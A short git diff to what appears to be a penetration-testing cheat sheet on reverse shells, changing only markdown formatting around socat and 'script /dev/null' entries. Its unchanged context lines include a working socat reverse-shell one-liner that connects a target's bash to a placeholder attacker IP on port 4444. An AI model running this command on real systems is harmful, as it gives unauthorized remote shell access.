@@ -162,7 +162,7 @@ And on your side authorize the connection with `xhost +targetIp` and catch it wi
 * socat
 
 Listener:
-`socat file:`tty`,raw,echo=0 yourIP:4444`
+```socat file:`tty`,raw,echo=0 yourIP:4444```
 
 target:
 `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:yourIP:4444`
@@ -184,8 +184,7 @@ spawn sh
 interact
 ```
 
-* Script
-
+* Script    
 `script /dev/null`
 
 
